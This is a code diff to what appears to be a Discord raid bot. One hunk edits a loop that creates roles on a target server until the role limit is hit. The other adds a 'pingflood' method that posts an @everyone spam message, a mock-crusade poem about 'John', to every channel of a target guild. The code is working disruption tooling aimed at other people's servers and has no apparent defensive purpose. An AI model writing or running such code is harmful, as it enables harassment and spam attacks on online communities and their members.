@@ -260,7 +260,7 @@ Kick Members: {selfpermissions.kick_members}'''
 		while 1:
 			try:
 				#a = await targetserver.create_role(name = "PWNED", colour = colour, permissions = permissions, reason = "FUCK YOU LOLOLOL")
-				await targetserver.create_role(name = "IN THE NAME OF JOHN", colour = colour, reason = "JOHN HAS ARRIVED")
+				await targetserver.create_role(name = "JOHNIST", colour = colour, reason = "IN THE NAME OF JOHN")
 			except:
 				print("Reached role limit!")
 				#await a.delete()
@@ -302,4 +302,33 @@ Kick Members: {selfpermissions.kick_members}'''
 		
 		await self.message.channel.send(f"sent {d}/{c} dms")
 	
+	async def pingflood(self, targetserver: discord.Guild): # 2020-06-01
 
+		print("starting ping flood")
+		await self.message.channel.send("starting ping flood")
+
+		for i in targetserver.channels:
+
+			await i.send('''@everyone
+
+**All hail the crusaders of John**
+
+The mercy of John has brought light to us all
+The noble Johnists of the realm stand tall
+Yet heretics bring a shadow upon distant lands
+And would seek to disobey John's sacred commands
+
+Those who skulk in the darkness are doomed to die
+And go to hell, instead of John's kingdom in the sky
+It is them who protect the faith of the True Lord
+And when blasphemy rises, they take up the sword
+
+To the land of heathens the crusaders travel
+The wicked plans of heretics unraveled
+Trekking through dark and twisted terrain
+They will nonetheless win, with the heretics slain
+
+The crusaders shall be revered in history
+Immortalized after inevitable victory
+The heretics will fall with our mighty assault
+Crusader, Crusader, Ioannes Vult''')
